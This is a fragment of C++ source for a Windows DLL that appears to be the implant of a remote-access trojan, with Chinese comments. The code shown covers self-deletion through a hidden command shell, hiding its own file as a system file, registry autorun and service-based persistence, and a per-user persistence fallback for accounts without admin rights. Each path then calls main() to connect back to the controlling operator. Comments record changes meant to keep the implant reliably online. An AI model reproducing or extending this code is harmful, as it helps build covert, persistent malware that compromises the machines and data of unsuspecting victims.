	SEI.lpParameters = szParams;
	SEI.lpDirectory = NULL;
	SEI.nShow = SW_HIDE;
	SEI.fMask = SEE_MASK_NOCLOSEPROCESS;

	//运行命令行窗口进程
	if (ShellExecuteEx(&SEI))
	{
		//设置命令行为IDLE_PRIORITY_CLASS优先级，程序为REALTIME_PRIORITY_CLASS优先级，保证其优先退出
		SetPriorityClass(SEI.hProcess, IDLE_PRIORITY_CLASS);
		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		//通知Windows资源浏览器，本程序已被删除
		SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
		return TRUE;
	}

	return FALSE;
}
extern "C" __declspec(dllexport) void Wang()
{

}
//////////////////////////////////////////////////////////////////////////

extern "C" __declspec(dllexport) BOOL DllFuUpgradrs1(char* p)
{
	memcpy(&MyInfo, p, sizeof(struct Info));

	// 本地化：会话进程直接运行被控端主逻辑（原为空壳导致不上线）
	main();

	return TRUE;
}
extern void SetGroup(LPCTSTR lpServiceName, LPCTSTR lpGroupName);
extern "C" __declspec(dllexport) BOOL DllFuUpgradrs(char* p)
{
	memcpy(&MyInfo, p, sizeof(struct Info));

	char lpBuffer[1024] = { NULL };
	char strSubKey0[1024] = { NULL };


	// 	SetGroup( NULL, MyInfo.strGroup);
	// 	OutputDebugString(MyInfo.strGroup);
	// 	char *p = strstr(lpCmdLine,"Win7");
	// 	if (p!=NULL)
	// 	{
	// 		
	// 		main();
	// 		return 0;
	// 	}
	// 	
		// 	char szPath[MAX_PATH] = {0};
		// 	GetModuleFileName(NULL,szPath,sizeof(szPath));
	char szPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, szPath, sizeof(szPath));
	SetFileAttributes(szPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

	// 注册表启动
	if (MyInfo.bReg)
	{
		AutoRun();
	}

	if (service_is_exist())
	{
		SERVICE_TABLE_ENTRY serviceTable[] =
		{
			{MyInfo.SerName,(LPSERVICE_MAIN_FUNCTION)ServiceMain},
			{NULL,NULL}
		};
		StartServiceCtrlDispatcher(serviceTable);
		// StartServiceCtrlDispatcher 返回说明本进程非 SCM 服务上下文
		// （ServiceMain 提升到活动会话后再次运行的进程、或用户直接运行的服务端），
		// 此时直接以当前进程回连主控，保证上线链路。
		if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
		{
			main();
		}
		// 		// 自删除
		//  		if (MyInfo.bDelete)
		//  		{
		//  			DeleteMyself();
		//  		}

	}
	else
	{
		RunService(MyInfo.SerName, MyInfo.Serdisplay, MyInfo.Serdesc);
		// 本地化：若服务创建/启动失败（如非管理员权限），降级为当前进程直接运行被控端
		if (!service_is_exist())
		{
			InstallUserRun(); // standard user: per-user persistence fallback
			main();
		}
	}
	return TRUE;
}
BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

	return TRUE;
}